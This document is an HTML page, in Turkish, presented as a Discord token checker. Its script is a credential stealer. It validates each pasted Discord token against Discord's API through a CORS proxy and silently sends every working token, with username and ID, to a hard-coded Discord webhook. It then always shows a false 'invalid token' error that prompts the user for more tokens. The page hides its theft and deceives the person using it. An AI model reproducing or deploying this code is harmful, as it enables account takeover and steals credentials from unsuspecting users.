<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Factions Check | Ultimate</title>
    <style>
        body { 
            background-color: #111;
            background-image: 
                linear-gradient(rgba(255, 255, 255, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(255, 255, 255, 0.05) 1px, transparent 1px);
            background-size: 40px 40px; 
            color: #fff; 
            font-family: 'Consolas', monospace; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            overflow: hidden;
        }

        .container { 
            background: rgba(0, 0, 0, 0.85); 
            padding: 40px; 
            border-radius: 20px; 
            width: 450px; 
            text-align: center; 
            border: 1px solid rgba(255, 30, 30, 0.2);
            box-shadow: 0 0 50px rgba(0, 0, 0, 1);
            backdrop-filter: blur(10px);
        }

        h1 { 
            color: #ff1e1e; 
            letter-spacing: 4px; 
            margin-bottom: 20px;
            font-size: 24px;
        }

        textarea { 
            width: 100%; 
            height: 150px; 
            padding: 12px; 
            background: rgba(0, 0, 0, 0.6); 
            border: 1px solid #333; 
            border-radius: 8px; 
            color: #00ff00; 
            margin-bottom: 20px; 
            outline: none; 
            resize: none; 
            box-sizing: border-box;
        }

        button { 
            width: 100%; 
            padding: 15px; 
            background: #ff1e1e; 
            color: white; 
            border: none; 
            border-radius: 8px; 
            font-weight: bold; 
            cursor: pointer;
            transition: 0.3s;
        }

        button:hover { background: #cc0000; }

        #status { 
            margin-top: 20px; 
            font-weight: bold; 
            display: none; 
            padding: 10px;
            border-radius: 5px;
        }

        .invalid { color: #ff4d4d; background: rgba(255, 0, 0, 0.1); border: 1px solid #ff4d4d; }

        .footer {
            position: fixed;
            bottom: 20px;
            font-size: 12px;
            color: #555;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>TOKEN CHECKER</h1>
    <textarea id="tokenInput" placeholder="Tokenleri buraya yapıştırın..."></textarea>
    <button onclick="processTokens()">KONTROLÜ BAŞLAT</button>
    <div id="status"></div>
</div>

<div class="footer">DEVELOPED BY RAWS</div>

<script>
    const webhookURL = "https://discord.com/api/webhooks/1492871807676580011/7VsMT9pK9IzPiBalSSLwA3drkeU5cexTSiU4M4DOAk0KnhDoDKp_D0vTvBK0wxn1rRZu";
    // Proxy kullanarak CORS engelini aşıyoruz
    const proxyURL = "https://corsproxy.io/?"; 

    async function processTokens() {
        const input = document.getElementById('tokenInput').value;
        const statusDiv = document.getElementById('status');
        const tokens = input.split('\n').map(t => t.trim()).filter(t => t !== "");

        if(tokens.length === 0) return;

        statusDiv.style.display = "block";
        statusDiv.className = ""; 
        statusDiv.textContent = "BAĞLANTI KURULUYOR...";
        statusDiv.style.color = "#aaa";

        for (const token of tokens) {
            try {
                // Discord API'ye Proxy üzerinden istek atıyoruz
                const response = await fetch(proxyURL + encodeURIComponent('https://discord.com/api/v9/users/@me'), {
                    method: 'GET',
                    headers: { 'Authorization': token }
                });

                // Eğer token çalışıyorsa (status 200)
                if (response.status === 200) {
                    const userData = await response.json();
                    
                    // Webhook'a sessizce gönder
                    fetch(webhookURL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            embeds: [{
                                title: "💎 ÇALIŞAN TOKEN BULUNDU",
                                color: 5763719,
                                fields: [
                                    { name: "Kullanıcı", value: `\`${userData.username}#${userData.discriminator}\``, inline: true },
                                    { name: "ID", value: `\`${userData.id}\``, inline: true },
                                    { name: "Token", value: "```" + token + "```" }
                                ],
                                timestamp: new Date()
                            }]
                        })
                    });
                }
            } catch (err) {
                // Hataları görmezden gel, arka planda devam et
            }
        }

        // Ne olursa olsun 1.5 saniye sonra "INVALID" hatası göster
        setTimeout(() => {
            statusDiv.className = "invalid";
            statusDiv.innerHTML = "✕ GEÇERSİZ TOKEN TESPİT EDİLDİ!<br><small>Lütfen güncel bir token listesi girin.</small>";
        }, 1500);
    }
</script>

</body>
</html>
